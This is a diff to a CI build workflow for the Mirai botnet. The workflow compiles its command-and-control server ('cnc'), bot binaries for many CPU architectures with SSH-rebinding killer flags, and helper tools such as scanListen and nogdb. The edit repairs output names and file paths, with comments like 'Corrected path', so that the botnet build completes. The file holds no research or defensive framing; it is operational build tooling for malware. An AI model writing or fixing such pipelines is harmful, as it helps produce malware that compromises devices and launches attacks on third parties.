@@ -25,7 +25,7 @@ jobs:
           cd cnc
           go get github.com/go-sql-driver/mysql
           go get github.com/mattn/go-shellwords
-          go build
+          go build -o cnc # Build the cnc binary and specify output name
           cd ..
 
       - name: Compile release
@@ -63,14 +63,14 @@ jobs:
             compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static" || true
             compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static" || true
 
-            mv /cnc/cnc /release
+            mv cnc/cnc release/ # Corrected path
             go build -o release/scanListen tools/scanListen.go
           elif [ "$BUILD_MODE" == "debug" ]; then
             gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -g -o debug/mirai.dbg
             gcc -std=c99 tools/enc.c -g -o debug/enc
             gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
             gcc -std=c99 tools/badbot.c -g -o debug/badbot
-            mv /cnc/cnc /debug
+            mv cnc/cnc debug/ # Corrected path
             go build -o debug/scanListen tools/scanListen.go
           else
             echo "Unknown parameter $BUILD_MODE: debug or release required"
